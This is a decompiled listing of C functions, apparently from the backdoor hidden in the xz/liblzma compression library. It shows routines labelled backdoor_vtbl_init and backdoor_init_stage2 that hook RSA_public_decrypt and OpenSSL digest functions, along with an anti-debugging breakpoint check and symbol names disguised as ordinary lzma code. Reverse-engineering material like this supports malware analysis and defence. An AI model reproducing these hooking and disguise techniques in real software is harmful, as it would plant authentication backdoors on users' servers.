    if ((param_2 != 0) && (uVar1 != 0)) {
      uVar4 = 0;
      if (param_5 != (ulong *)0x0) {
        uVar4 = *param_5;
      }
      lVar6 = 0;
      for (; uVar4 < uVar1; uVar4 = uVar4 + 1) {
        plVar5 = (long *)(lVar2 + lVar6);
        uVar7 = *(ulong *)(param_1[0x11] + uVar4 * 8);
        if ((uVar7 & 1) == 0) {
          plVar5 = (long *)(lVar2 + uVar7);
          iVar3 = process_elf_seg(param_1,plVar5,8,4);
          if (iVar3 == 0) {
            return (long *)0x0;
          }
          if ((*plVar5 == param_2 - lVar2) &&
             ((param_3 == (long *)0x0 || ((param_3 <= plVar5 && (plVar5 <= param_4)))))) {
LAB_00101d78:
            if (param_5 != (ulong *)0x0) {
              *param_5 = uVar4 + 1;
              return plVar5;
            }
            return plVar5;
          }
          lVar6 = uVar7 + 8;
        }
        else {
          while (uVar7 = uVar7 >> 1, uVar7 != 0) {
            if ((uVar7 & 1) != 0) {
              iVar3 = process_elf_seg(param_1,plVar5,8,4);
              if (iVar3 == 0) {
                return (long *)0x0;
              }
              if ((*plVar5 == param_2 - lVar2) &&
                 ((param_3 == (long *)0x0 || ((param_3 <= plVar5 && (plVar5 <= param_4))))))
              goto LAB_00101d78;
            }
            plVar5 = plVar5 + 1;
          }
          lVar6 = lVar6 + 0x1f8;
        }
      }
      if (param_5 != (ulong *)0x0) {
        *param_5 = uVar4;
      }
    }
  }
  return (long *)0x0;
}



long _Llz_encode_1(long *param_1,long *param_2,uint param_3,ulong param_4,int param_5)

{
  int iVar1;
  uint *puVar2;
  ulong uVar3;
  
  iVar1 = apply_one_entry_ex(0,0x67,5,4);
  uVar3 = 0;
  if (iVar1 != 0) {
    for (; uVar3 < param_3; uVar3 = uVar3 + 1) {
      if ((((param_2[1] & 0xffffffffU) == param_4) &&
          (puVar2 = (uint *)(((ulong)param_2[1] >> 0x20) * 0x18 + param_1[7]),
          *(short *)((long)puVar2 + 6) == 0)) &&
         (iVar1 = table_get((void *)((ulong)*puVar2 + param_1[6]),(void *)0x0), iVar1 == param_5)) {
        return *param_2 + *param_1;
      }
      param_2 = param_2 + 3;
    }
  }
  return 0;
}



undefined8 _Ldelta_coder_end_1(long param_1,undefined4 param_2)

{
  undefined8 uVar1;
  
  if (((*(byte *)(param_1 + 0xd0) & 1) != 0) && (*(int *)(param_1 + 0x48) != 0)) {
    uVar1 = _Llz_encode_1(param_1,*(undefined8 *)(param_1 + 0x40),*(int *)(param_1 + 0x48),7,param_2
                         );
    return uVar1;
  }
  return 0;
}



undefined8 _Ldelta_decode_part_0(long param_1,undefined4 param_2)

{
  undefined8 uVar1;
  
  if (((*(byte *)(param_1 + 0xd0) & 2) != 0) && (*(int *)(param_1 + 0x80) != 0)) {
    uVar1 = _Llz_encode_1(param_1,*(undefined8 *)(param_1 + 0x78),*(int *)(param_1 + 0x80),6,param_2
                         );
    return uVar1;
  }
  return 0;
}



undefined  [16]
_Llzma_check_update_0(long *param_1,long *param_2,undefined8 param_3,undefined8 param_4)

{
  int iVar1;
  ulong uVar2;
  int *piVar3;
  ulong uVar4;
  long lVar5;
  undefined auVar6 [16];
  
  iVar1 = apply_one_entry_ex(0,0xcb,7,0xc);
  uVar2 = 0;
  if (iVar1 != 0) {
    uVar2 = param_1[0x13];
    if (uVar2 == 0) {
      for (lVar5 = 0; (uint)lVar5 < (uint)*(ushort *)(param_1 + 3); lVar5 = lVar5 + 1) {
        piVar3 = (int *)(lVar5 * 0x38 + param_1[2]);
        if ((*piVar3 == 1) && ((*(byte *)(piVar3 + 1) & 1) != 0)) {
          uVar2 = (*param_1 - param_1[1]) + *(long *)(piVar3 + 4);
          uVar4 = *(long *)(piVar3 + 10) + uVar2;
          uVar2 = uVar2 & 0xfffffffffffff000;
          if ((uVar4 & 0xfff) != 0) {
            uVar4 = (uVar4 & 0xfffffffffffff000) + 0x1000;
          }
          lVar5 = uVar4 - uVar2;
          param_1[0x13] = uVar2;
          param_1[0x14] = lVar5;
          goto LAB_00101f45;
        }
      }
    }
    else {
      lVar5 = param_1[0x14];
LAB_00101f45:
      *param_2 = lVar5;
    }
  }
  auVar6._8_8_ = param_4;
  auVar6._0_8_ = uVar2;
  return auVar6;
}



ulong _Lindex_tree_append_part_0(long *param_1,long *param_2)

{
  long lVar1;
  bool bVar2;
  int iVar3;
  long lVar4;
  ulong uVar5;
  int *piVar6;
  ulong uVar7;
  long lVar8;
  long lVar9;
  ulong uVar10;
  long local_20;
  
  iVar3 = _Llzma_index_iter_rewind_cold(0xbd,0xe,0xb,0);
  if (iVar3 != 0) {
    uVar5 = param_1[0x15];
    lVar1 = *param_1;
    local_20 = 0;
    if (uVar5 != 0) {
      *param_2 = param_1[0x16];
      return uVar5;
    }
    lVar4 = _Llzma_check_update_0(param_1,&local_20);
    if (lVar4 != 0) {
      bVar2 = false;
      lVar8 = 0;
      uVar5 = 0;
      for (lVar9 = 0; (uint)lVar9 < (uint)*(ushort *)(param_1 + 3); lVar9 = lVar9 + 1) {
        piVar6 = (int *)(lVar9 * 0x38 + param_1[2]);
        if ((*piVar6 == 1) && ((piVar6[1] & 7U) == 4)) {
          uVar7 = (lVar1 - param_1[1]) + *(long *)(piVar6 + 4);
          uVar10 = *(long *)(piVar6 + 10) + uVar7;
          uVar7 = uVar7 & 0xfffffffffffff000;
          if ((uVar10 & 0xfff) != 0) {
            uVar10 = (uVar10 & 0xfffffffffffff000) + 0x1000;
          }
          if ((ulong)(lVar4 + local_20) <= uVar7) {
            if (bVar2) {
              if (uVar7 < uVar5) {
                lVar8 = uVar10 - uVar7;
                uVar5 = uVar7;
              }
            }
            else {
              bVar2 = true;
              lVar8 = uVar10 - uVar7;
              uVar5 = uVar7;
            }
          }
        }
      }
      if (bVar2) {
        param_1[0x15] = uVar5;
        param_1[0x16] = lVar8;
        *param_2 = lVar8;
        return uVar5;
      }
    }
  }
  return 0;
}



void * _Llzip_decode_0(undefined8 param_1,int *param_2,void *param_3)

{
  int iVar1;
  void *startptr;
  void *endptr;
  ulong local_30 [2];
  
  iVar1 = _Llzma_index_iter_rewind_cold(0xb6,7,10,0);
  if (iVar1 != 0) {
    local_30[0] = 0;
    startptr = (void *)_Lindex_tree_append_part_0(param_1,local_30);
    if ((startptr != (void *)0x0) && (0x2b < local_30[0])) {
      endptr = (void *)(local_30[0] + (long)startptr);
      if (param_3 != (void *)0x0) {
        if (endptr <= param_3) {
          return (void *)0x0;
        }
        if (startptr < param_3) {
          startptr = param_3;
        }
      }
      for (; startptr < endptr; startptr = (void *)((long)startptr + 1)) {
        iVar1 = table_get(startptr,endptr);
        if (iVar1 != 0) {
          if (*param_2 == 0) {
            *param_2 = iVar1;
            return startptr;
          }
          if (*param_2 == iVar1) {
            return startptr;
          }
        }
      }
    }
  }
  return (void *)0x0;
}



ulong _Lmicrolzma_decode_0(long *param_1,long *param_2,int param_3)

{
  bool bVar1;
  long lVar2;
  int *piVar3;
  long lVar4;
  ulong uVar5;
  ulong uVar6;
  ulong uVar7;
  ulong uVar8;
  ulong uVar9;
  
  uVar6 = param_1[0x17];
  if (uVar6 != 0) {
    if (param_3 != 0) {
      lVar2 = param_1[0x19];
      *param_2 = lVar2;
      uVar6 = uVar6 - lVar2;
      if (lVar2 == 0) {
        uVar6 = 0;
      }
      return uVar6;
    }
    *param_2 = param_1[0x18];
    return uVar6;
  }
  bVar1 = false;
  lVar2 = 0;
  uVar5 = 0;
  uVar6 = 0;
  for (uVar8 = 0; (uint)uVar8 < (uint)*(ushort *)(param_1 + 3); uVar8 = uVar8 + 1) {
    piVar3 = (int *)(uVar8 * 0x38 + param_1[2]);
    if ((*piVar3 == 1) && ((piVar3[1] & 7U) == 6)) {
      if (*(ulong *)(piVar3 + 10) < *(ulong *)(piVar3 + 8)) {
        return 0;
      }
      uVar7 = (*param_1 - param_1[1]) + *(long *)(piVar3 + 4);
      uVar9 = *(ulong *)(piVar3 + 10) + uVar7;
      uVar7 = uVar7 & 0xfffffffffffff000;
      if ((uVar9 & 0xfff) != 0) {
        uVar9 = (uVar9 & 0xfffffffffffff000) + 0x1000;
      }
      if (bVar1) {
        if (uVar5 + lVar2 < uVar9) {
          lVar2 = uVar9 - uVar7;
          uVar6 = uVar8 & 0xffffffff;
          uVar5 = uVar7;
        }
      }
      else {
        lVar2 = uVar9 - uVar7;
        bVar1 = true;
        uVar6 = uVar8 & 0xffffffff;
        uVar5 = uVar7;
      }
    }
  }
  if (bVar1) {
    lVar2 = uVar6 * 0x38 + param_1[2];
    lVar4 = (*param_1 - param_1[1]) + *(long *)(lVar2 + 0x10);
    uVar8 = *(long *)(lVar2 + 0x28) + lVar4;
    uVar5 = lVar4 + *(long *)(lVar2 + 0x20);
    uVar6 = uVar8;
    if ((uVar8 & 0xfff) != 0) {
      uVar6 = (uVar8 & 0xfffffffffffff000) + 0x1000;
    }
    lVar2 = uVar6 - uVar8;
    param_1[0x17] = uVar5;
    param_1[0x19] = lVar2;
    param_1[0x18] = uVar6 - uVar5;
    if (param_3 == 0) {
      *param_2 = uVar6 - uVar5;
      return uVar5;
    }
    *param_2 = lVar2;
    if (lVar2 != 0) {
      return uVar8;
    }
  }
  return 0;
}



ulong _Lauto_decode_1(long *param_1,ulong param_2,long param_3,int param_4)

{
  ulong uVar1;
  ulong uVar2;
  ulong uVar3;
  
  uVar1 = process_elf_seg();
  if ((((int)uVar1 != 0) && (uVar1 = 1, param_4 != 0)) && (*(int *)((long)param_1 + 0x4c) != 0)) {
    uVar3 = (*param_1 - param_1[1]) + param_1[10];
    uVar2 = param_1[0xb] + uVar3;
    uVar3 = uVar3 & 0xfffffffffffff000;
    if ((uVar2 & 0xfff) != 0) {
      uVar2 = (uVar2 & 0xfffffffffffff000) + 0x1000;
    }
    if ((uVar2 <= param_2) || (uVar1 = 0, param_2 < uVar3)) {
      uVar1 = (ulong)(param_2 + param_3 <= uVar3 && param_2 < uVar3 || uVar2 < param_2 + param_3);
    }
  }
  return uVar1;
}



undefined8 _Lhc_find_func_1(ulong param_1,long param_2,long param_3)

{
  long lVar1;
  int iVar2;
  int *piVar3;
  undefined8 uVar4;
  ulong uVar5;
  undefined8 local_38;
  undefined8 local_30;
  
  if (param_2 == 0) {
    return 0;
  }
  if (param_1 < 0x1000000) {
LAB_00102373:
    uVar4 = 0;
  }
  else {
    uVar5 = param_1 & 0xfffffffffffff000;
    if (uVar5 < param_1 + param_2) {
      if (param_3 == 0) goto LAB_00102373;
      do {
        local_38 = 0;
        lVar1 = *(long *)(param_3 + 0x10);
        if (((lVar1 == 0) || (*(long *)(lVar1 + 0x50) == 0)) ||
           (*(code **)(lVar1 + 0x40) == (code *)0x0)) goto LAB_00102373;
        local_30 = 1;
        iVar2 = (**(code **)(lVar1 + 0x40))(1,0,0,0,&local_38,uVar5);
        if ((iVar2 < 0) &&
           ((piVar3 = (int *)(**(code **)(*(long *)(param_3 + 0x10) + 0x50))(), *piVar3 == 0xe ||
            (uVar5 == 0)))) {
          *piVar3 = 0;
          goto LAB_00102373;
        }
        uVar5 = uVar5 + 0x1000;
      } while (uVar5 < param_1 + param_2);
    }
    uVar4 = 1;
  }
  return uVar4;
}



void j_tls_get_addr(undefined8 param_1)

{
  __tls_get_addr(param_1);
  return;
}



pointer_____offset__0x180___ get_lzma_allocator_addr(void)

{
  uint local_14;
  pointer_____offset__0x180___ local_10;
  
  local_10 = _Llookup_filter_part_0;
  for (local_14 = 0; local_14 < 0xc; local_14 = local_14 + 1) {
    local_10 = local_10 + 0x20;
  }
  return local_10;
}



pointer_____offset__0x2a0___ _Llzma_lz_encoder_memusage_1(void)

{
  uint local_14;
  pointer_____offset__0x2a0___ local_10;
  
  local_10 = _Lfilter_optmap_0;
  for (local_14 = 0; local_14 < 0xc; local_14 = local_14 + 1) {
    local_10 = local_10 + 0x38;
  }
  return local_10;
}



undefined8 FUN_00102530(ulong *param_1,long *param_2,long *param_3,long param_4)

{
  long lVar1;
  int iVar2;
  long lVar3;
  ulong uVar4;
  long lVar5;
  char *pcVar6;
  ulong uVar7;
  long lVar8;
  long *plVar9;
  ulong uVar10;
  ulong uVar11;
  ulong uVar12;
  ulong uVar13;
  byte bVar14;
  long local_88;
  long local_80;
  long local_78;
  byte local_6f;
  byte local_65;
  uint local_64;
  int local_58;
  long local_50;
  
  bVar14 = 0;
  local_88 = 0;
  lVar3 = get_lzma_allocator(1);
  *(long **)(lVar3 + 0x10) = param_3;
  uVar4 = _Llzma_check_update_0(param_2,&local_88);
  if (uVar4 != 0) {
    uVar13 = local_88 + uVar4;
    lVar5 = lzma_alloc(0x758,lVar3);
    *(long *)(param_4 + 0x70) = lVar5;
    if (lVar5 != 0) {
      *(int *)(param_4 + 0x120) = *(int *)(param_4 + 0x120) + 1;
    }
    lVar5 = _Ldelta_decode_part_0(param_2,0x228);
    if (((lVar5 != 0) && (uVar10 = *param_2 + *(long *)(*param_2 + 0x18), uVar10 < uVar13)) &&
       (uVar4 <= uVar10)) {
      plVar9 = &local_80;
      lVar8 = 0x16;
      uVar11 = uVar10 + 0x200;
      if (uVar13 <= uVar10 + 0x200) {
        uVar11 = uVar13;
      }
      for (; lVar8 != 0; lVar8 = lVar8 + -1) {
        *(undefined4 *)plVar9 = 0;
        plVar9 = (long *)((long)plVar9 + (ulong)bVar14 * -8 + 4);
      }
                    // Returns "EVP_Digest"
      pcVar6 = table_lookup_multi((long)param_3,0xf8,0);
      if (pcVar6 != (char *)0x0) {
        lVar8 = *(long *)(pcVar6 + 8);
        lVar1 = *param_3;
        *(int *)(param_4 + 0x120) = *(int *)(param_4 + 0x120) + 1;
        *(long *)(param_4 + 0xf0) = lVar8 + lVar1;
      }
      uVar12 = 0;
      while (uVar10 < uVar11) {
        iVar2 = code_dasm(&local_80,uVar10,uVar11);
        if (iVar2 == 0) {
          uVar10 = uVar10 + 1;
        }
        else {
          if (local_58 == 0x10d) {
            if (((((local_65 & 0x48) == 0x48) && (local_64 >> 8 == 0x50700)) &&
                (uVar7 = local_80 + local_78 + local_50, uVar4 <= uVar7)) && (uVar7 < uVar13)) {
              uVar12 = uVar7;
            }
          }
          else if (((uVar12 != 0) && (local_58 == 0x17f)) &&
                  ((local_64 >> 8 == 0x50200 &&
                   (((local_6f & 1) != 0 && (lVar5 == local_50 + local_80 + local_78)))))) {
                    // Returns "EVP_sha256"
            pcVar6 = table_lookup_multi((long)param_3,0xc60,0);
            if (pcVar6 != (char *)0x0) {
              *(long *)(param_4 + 0x58) = *(long *)(pcVar6 + 8) + *param_3;
              *(int *)(param_4 + 0x120) = *(int *)(param_4 + 0x120) + 1;
            }
            *param_1 = uVar12;
            return 1;
          }
          uVar10 = uVar10 + local_78;
        }
      }
    }
    lzma_free(*(undefined8 *)(param_4 + 0x70),lVar3);
  }
  return 0;
}



void FUN_00102750(long param_1)

{
  undefined4 *puVar1;
  byte *pbVar2;
  
  if (param_1 != 0) {
    puVar1 = *(undefined4 **)(param_1 + 0x40);
    if (puVar1 != (undefined4 *)0x0) {
      *puVar1 = *(undefined4 *)(param_1 + 0x48);
      if (*(undefined8 **)(param_1 + 0xf8) != (undefined8 *)0x0) {
        **(undefined8 **)(param_1 + 0xf8) = puVar1;
      }
    }
    if (*(undefined4 **)(param_1 + 0x50) != (undefined4 *)0x0) {
      **(undefined4 **)(param_1 + 0x50) = *(undefined4 *)(param_1 + 0x58);
    }
    pbVar2 = *(byte **)(param_1 + 0x60);
    if (pbVar2 != (byte *)0x0) {
      *pbVar2 = *pbVar2 & ~*(byte *)(param_1 + 0x68);
    }
    if (*(undefined4 **)(param_1 + 0x78) != (undefined4 *)0x0) {
      **(undefined4 **)(param_1 + 0x78) = 0;
    }
    if (*(undefined8 **)(param_1 + 0x70) != (undefined8 *)0x0) {
      **(undefined8 **)(param_1 + 0x70) = 0;
    }
  }
  return;
}



undefined8 backdoor_vtbl_init(ctx2 *ctx2)

{
  undefined8 uVar1;
  
  uVar1 = 5;
  if (ctx2 != (ctx2 *)0x0) {
    ctx2->fn_DSA_get0_pub_key = &_Lfilter_options_0;
    uVar1 = 0;
    if (ctx2->field48_0x30 == 0) {
      *(undefined8 *)&ctx2->field_0x68 = 4;
      *(undefined **)&ctx2->field_0x40 = &LAB_001028b0;
      ctx2->fn_RSA_public_decrypt = RSA_public_decrypt;
      ctx2->fn_EC_KEY_get0_group = _Llzma_index_init_0;
      *(code **)&ctx2->field_0x58 = _Llzma12_mode_map_part_1;
      *(code **)&ctx2->field_0x70 = _Lfile_info_decode_0;
      *(code **)&ctx2->field_0x78 = _Lbt_skip_func_part_0;
      uVar1 = 0x65;
    }
  }
  return uVar1;
}



undefined8 _Llzma_delta_props_decode_part_0(code **param_1)

{
  undefined8 uVar1;
  
  uVar1 = 5;
  if (param_1 != (code **)0x0) {
    *param_1 = _Llzma_code_part_1;
    param_1[1] = _Llzma_index_memusage_part_0;
    param_1[2] = (code *)&global_ctx;
    uVar1 = 0;
  }
  return uVar1;
}



undefined8 FUN_00102870(long param_1)

{
  if (*(int *)(param_1 + 0x120) == 0x1d) {
    if (*(long *)(param_1 + 0x18) != 0) {
      return 1;
    }
    if (*(long *)(param_1 + 0x20) != 0) {
      return 1;
    }
    if (*(long *)(param_1 + 0x28) != 0) {
      return 1;
    }
    *(code **)(param_1 + 0x18) = backdoor_init_stage2;
    *(code **)(param_1 + 0x28) = _Llzma_delta_props_decode_part_0;
  }
  return 0;
}



bool FUN_00102a30(uint param_1,long *param_2,undefined8 *param_3,long *param_4,undefined8 param_5,
                 long param_6,int *param_7)

{
  int iVar1;
  long lVar2;
  
  param_6 = param_6 + (ulong)param_1 * 0x20;
  lVar2 = *(long *)(param_6 + 8);
  if (lVar2 == 0) {
    return false;
  }
  *param_2 = lVar2;
  *param_3 = *(undefined8 *)(param_6 + 0x10);
  lVar2 = _Lstream_encoder_update_0(param_5,*param_2,0,0,0);
  *param_4 = lVar2;
  if (lVar2 == 0) {
    lVar2 = _Lstream_encoder_update_1(param_5,*param_2,0,0,0);
    *param_4 = lVar2;
    if (lVar2 == 0) {
      return false;
    }
  }
  iVar1 = _Lauto_decode_1(param_5,*param_4 + -8,0x10,1);
  if (iVar1 == 0) {
    return false;
  }
  if (*param_7 != 0) {
    iVar1 = check_software_breakpoint(*param_2,*param_2 + 4,0xe230);
    return iVar1 != 0;
  }
  return true;
}



bool FUN_00102af0(ulong param_1,ulong param_2,undefined8 param_3,undefined8 param_4,long param_5,
                 undefined4 *param_6)

{
  int iVar1;
  long lVar2;
  long *plVar3;
  undefined8 uVar4;
  undefined8 local_88;
  long local_80;
  long local_78;
  int local_58;
  long local_48;
  
  plVar3 = &local_80;
  for (lVar2 = 0x16; lVar2 != 0; lVar2 = lVar2 + -1) {
    *(undefined4 *)plVar3 = 0;
    plVar3 = (long *)((long)plVar3 + 4);
  }
  if ((param_1 != param_2 && param_1 != 0) && (param_2 != 0)) {
    lVar2 = param_2 - param_1;
    if (param_2 <= param_1) {
      lVar2 = param_1 - param_2;
    }
    if (((lVar2 < 0x10) && (*(long *)(param_5 + 0x268) != 0)) && (*(long *)(param_5 + 0x288) != 0))
    {
      uVar4 = *(undefined8 *)(param_5 + 0x290);
      iVar1 = _Llzma_mt_block_size_1(*(long *)(param_5 + 0x288),uVar4,&local_80);
      lVar2 = local_80;
      if (iVar1 != 0) {
        iVar1 = code_dasm(&local_80,local_78 + local_80,uVar4);
        if ((iVar1 != 0) && (local_58 == 0x168)) {
          local_88 = 0;
          lVar2 = local_78 + local_48 + local_80;
          apply_method_1(lVar2,0,&local_88,param_3,param_4,*param_6);
          uVar4 = local_88;
        }
        iVar1 = _Llzma_properties_size_0(lVar2,uVar4,0,0x109,param_1);
        if (iVar1 != 0) {
          iVar1 = _Llzma_properties_size_0(lVar2,uVar4,0,0x109,param_2);
          return iVar1 != 0;
        }
      }
    }
  }
  return false;
}



ulong FUN_00102c40(uint param_1,long param_2,ulong param_3,long param_4)

{
  ulong uVar1;
  int iVar2;
  ulong uVar3;
  long lVar4;
  long *plVar5;
  ulong uVar6;
  long local_80;
  long local_78;
  byte local_6f;
  byte local_65;
  uint local_64;
  ulong local_50;
  
  plVar5 = &local_80;
  for (lVar4 = 0x16; lVar4 != 0; lVar4 = lVar4 + -1) {
    *(undefined4 *)plVar5 = 0;
    plVar5 = (long *)((long)plVar5 + 4);
  }
  param_2 = param_2 + (ulong)param_1 * 0x20;
  uVar6 = *(ulong *)(param_2 + 8);
  if (uVar6 != 0) {
    uVar1 = *(ulong *)(param_2 + 0x10);
    while (uVar6 < uVar1) {
      iVar2 = _Llzma_properties_size_0(uVar6,uVar1,&local_80,0x10b,0);
      if (iVar2 == 0) {
        uVar6 = uVar6 + 1;
      }
      else {
        if ((local_65 & 0x48) != 0x48) {
          if ((local_6f & 1) == 0) {
            if (param_3 == 0) {
              return 0;
            }
          }
          else {
            uVar3 = local_50;
            if ((local_64 & 0xff00ff00) == 0x5000000) {
              uVar3 = local_50 + local_80 + local_78;
            }
            if ((param_3 <= uVar3) && (uVar3 <= param_4 - 4U)) {
              return uVar3;
            }
          }
        }
        uVar6 = uVar6 + local_78;
      }
    }
  }
  return 0;
}



void FUN_00102d10(undefined8 param_1,int *param_2)

{
  ulong *puVar1;
  ulong uVar2;
  int iVar3;
  ulong uVar4;
  long lVar5;
  ulong *puVar6;
  ulong uVar7;
  ulong uVar8;
  long lVar9;
  int *piVar10;
  ulong uVar11;
  ulong *puVar12;
  long lVar13;
  int local_94;
  ulong local_90;
  undefined8 local_88;
  ulong local_80;
  long local_78;
  byte local_65;
  uint local_64;
  int local_58;
  long local_50;
  long local_48;
  
  iVar3 = 0x10;
  piVar10 = param_2;
  do {
    *piVar10 = iVar3;
    iVar3 = iVar3 + 8;
    piVar10 = piVar10 + 8;
  } while (iVar3 != 0xe8);
  puVar12 = &local_80;
  for (lVar9 = 0x16; lVar9 != 0; lVar9 = lVar9 + -1) {
    *(undefined4 *)puVar12 = 0;
    puVar12 = (ulong *)((long)puVar12 + 4);
  }
  local_90 = 0;
  local_88 = 0;
  uVar4 = _Llzma_check_update_0(param_1,&local_90);
  if ((uVar4 != 0) && (0x10 < local_90)) {
    uVar11 = local_90 + uVar4;
    lVar9 = 0;
    while( true ) {
      local_94 = 0;
      lVar9 = _Llzip_decode_0(param_1,&local_94,lVar9);
      if (lVar9 == 0) break;
      lVar13 = 0;
      do {
        if (((*(long *)((long)param_2 + lVar13 + 0x18) == 0) &&
            (*(int *)((long)param_2 + lVar13) == local_94)) &&
           (lVar5 = _Lstream_encode_1(uVar4,uVar11,lVar9), lVar5 != 0)) {
          *(long *)((long)param_2 + lVar13 + 0x18) = lVar5;
        }
        lVar13 = lVar13 + 0x20;
      } while (lVar13 != 0x360);
      lVar9 = lVar9 + 1;
    }
    puVar12 = (ulong *)(param_2 + 2);
    puVar1 = (ulong *)(param_2 + 0xda);
    puVar6 = puVar12;
    do {
      uVar8 = puVar6[2];
      if (uVar8 != 0) {
        if (uVar4 <= uVar8) {
          if (*puVar6 < uVar4) {
            *puVar6 = uVar4;
          }
          if (uVar4 != uVar8) goto LAB_00102e38;
        }
        if (uVar4 <= puVar6[1] - 1) {
          puVar6[1] = uVar4;
        }
      }
LAB_00102e38:
      puVar6 = puVar6 + 4;
      uVar8 = uVar4;
    } while (puVar6 != puVar1);
LAB_00102e44:
    if (uVar8 < uVar11) {
      iVar3 = code_dasm(&local_80,uVar8,uVar11);
      uVar8 = uVar8 + 1;
      if (iVar3 != 0) {
        uVar8 = local_80 + local_78;
        if (local_58 == 0x168) {
          if (local_48 == 0) goto LAB_00102e44;
          uVar7 = local_80 + local_48 + local_78;
LAB_00102ec5:
          if (uVar7 == 0) goto LAB_00102e44;
        }
        else {
          uVar7 = local_80;
          if (local_58 == 0xa5fe) goto LAB_00102ec5;
          if (((local_58 != 0x10d) || ((local_65 & 0x48) != 0x48)) ||
             ((local_64 & 0xff00ff00) != 0x5000000)) goto LAB_00102e44;
          uVar7 = local_50 + uVar8;
        }
        if ((uVar4 <= uVar7) && (puVar6 = puVar12, uVar7 <= uVar11)) {
          do {
            uVar2 = puVar6[2];
            if (uVar2 != 0) {
              if (uVar7 <= uVar2) {
                if (*puVar6 < uVar7) {
                  *puVar6 = uVar7;
                }
                if (uVar2 != uVar7) goto LAB_00102f11;
              }
              if (uVar7 <= puVar6[1] - 1) {
                puVar6[1] = uVar7;
              }
            }
LAB_00102f11:
            puVar6 = puVar6 + 4;
          } while (puVar6 != puVar1);
        }
      }
      goto LAB_00102e44;
    }
    while (uVar8 = _Lstream_encoder_update_0(param_1,0,uVar4,uVar11,&local_88), puVar6 = puVar12,
          uVar8 != 0) {
      do {
        uVar7 = puVar6[2];
        if (uVar7 != 0) {
          if (uVar8 <= uVar7) {
            if (*puVar6 < uVar8) {
              *puVar6 = uVar8;
            }
            if (uVar8 != uVar7) goto LAB_00102f6e;
          }
          if (uVar8 <= puVar6[1] - 1) {
            puVar6[1] = uVar8;
          }
        }
LAB_00102f6e:
        puVar6 = puVar6 + 4;
      } while (puVar6 != puVar1);
    }
    do {
      uVar4 = puVar12[2];
      if (uVar4 != 0) {
        if (uVar11 <= uVar4) {
          if (*puVar12 < uVar11) {
            *puVar12 = uVar11;
          }
          if (uVar4 != uVar11) goto LAB_00102f8d;
        }
        if (uVar11 <= puVar12[1] - 1) {
          puVar12[1] = uVar11;
        }
      }
LAB_00102f8d:
      puVar12 = puVar12 + 4;
    } while (puVar12 != puVar1);
  }
  return;
}



void FUN_00102fd0(ulong param_1,ulong param_2,ulong param_3,ulong param_4,ulong *param_5,
                 long param_6)

{
  byte bVar1;
  int iVar2;
  uint uVar3;
  long lVar4;
  uint uVar5;
  ulong uVar6;
  long *plVar7;
  ulong uVar8;
  uint uVar9;
  ulong uVar10;
  long local_80;
  long local_78;
  undefined4 local_70;
  byte local_65;
  undefined4 local_64;
  byte local_60;
  int local_58;
  ulong local_50;
  
  *param_5 = 0;
  if (param_1 < param_2) {
    plVar7 = &local_80;
    for (lVar4 = 0x16; lVar4 != 0; lVar4 = lVar4 + -1) {
      *(undefined4 *)plVar7 = 0;
      plVar7 = (long *)((long)plVar7 + 4);
    }
    while (iVar2 = _Llzma_filters_update_0(param_1,param_2,1,1,&local_80), iVar2 != 0) {
      uVar10 = 0;
      if (((local_70 & 0x100) != 0) && (uVar10 = local_50, (local_64 & 0xff00ff00) == 0x5000000)) {
        uVar10 = local_80 + local_50 + local_78;
      }
      uVar9 = 0;
      if ((local_70 & 0x1040) != 0) {
        if ((local_70 & 0x40) == 0) {
          uVar9 = local_70 >> 8 & 0x10;
          if (((local_70 & 0x1000) != 0) && (uVar9 = (uint)local_60, (local_70 & 0x20) != 0)) {
            uVar9 = (uint)local_65 << 3;
            bVar1 = local_60;
            goto LAB_001030b4;
          }
        }
        else {
          uVar9 = (uint)local_64._2_1_;
          if ((local_70 & 0x20) != 0) {
            uVar9 = (uint)local_65 * 2;
            bVar1 = local_64._2_1_;
LAB_001030b4:
            uVar9 = (uint)bVar1 | uVar9 & 8;
          }
        }
      }
      param_1 = local_80 + local_78;
      if ((param_3 <= uVar10) && (uVar10 < param_4)) {
        uVar8 = param_1 + 0x40;
        if (*(ulong *)(param_6 + 0x60) < param_1 + 0x40) {
          uVar8 = *(ulong *)(param_6 + 0x60);
        }
        uVar5 = 0;
        uVar3 = 0;
        uVar6 = param_1;
LAB_001030f0:
        do {
          while( true ) {
            iVar2 = code_dasm(&local_80,uVar6,uVar8);
            if (iVar2 != 0) break;
            uVar6 = uVar6 + 1;
LAB_0010323f:
            if (uVar8 <= uVar6) goto LAB_0010324b;
          }
          uVar6 = local_78 + local_80;
          if (local_58 == 0x109) {
            bVar1 = local_64._3_1_;
            if ((local_70 & 0x1040) == 0) {
              if ((local_70 & 0x40) != 0) goto LAB_00103217;
            }
            else if ((local_70 & 0x40) == 0) {
              uVar3 = local_70._1_1_ & 0xffffff10;
              if (((local_70 & 0x1000) != 0) && (uVar3 = (uint)local_60, (local_70 & 0x20) != 0)) {
                uVar3 = (uint)local_60 | (local_65 & 1) << 3;
              }
            }
            else {
              uVar3 = (uint)local_64._2_1_;
              if ((local_70 & 0x20) != 0) {
                uVar3 = (uint)local_64._2_1_ | (uint)local_65 * 2 & 8;
              }
LAB_00103217:
              uVar5 = (uint)bVar1;
              if ((local_70 & 0x20) != 0) {
                uVar5 = (uint)bVar1 | (local_65 & 1) << 3;
              }
            }
          }
          else if (local_58 == 0x10b) {
            if ((local_70 & 0x40) == 0) {
              if ((local_70 & 0x1040) != 0) {
                uVar5 = (uint)(local_70._1_1_ & 0x10);
                bVar1 = local_60;
                if ((local_70 & 0x1000) != 0) goto LAB_00103217;
                if ((char)uVar9 != (char)uVar3) goto LAB_0010323f;
                uVar5 = 0;
                uVar9 = (uint)(local_70._1_1_ & 0x10);
                goto LAB_001030f0;
              }
            }
            else {
              uVar3 = (uint)local_64._3_1_;
              if ((local_70 & 0x20) == 0) {
                if ((local_70 & 0x1040) != 0) {
                  uVar5 = (uint)local_64._2_1_;
                }
              }
              else {
                uVar3 = (uint)local_64._3_1_ | (uint)local_65 * 8 & 8;
                if ((local_70 & 0x1040) != 0) {
                  uVar5 = (uint)(local_65 * '\x02' & 8 | local_64._2_1_);
                }
              }
            }
          }
          if ((char)uVar9 != (char)uVar3) goto LAB_0010323f;
          uVar9 = uVar5;
        } while ((char)uVar5 != '\a');
        iVar2 = _Llzma_optimum_normal_0
                          (local_78 + local_80,uVar8,
                           *(undefined8 *)(*(long *)(param_6 + 0x20) + 0xa8),&local_80);
        if (iVar2 != 0) {
          *param_5 = uVar10;
          return;
        }
      }
LAB_0010324b:
      if (param_2 <= param_1) {
        return;
      }
    }
  }
  return;
}



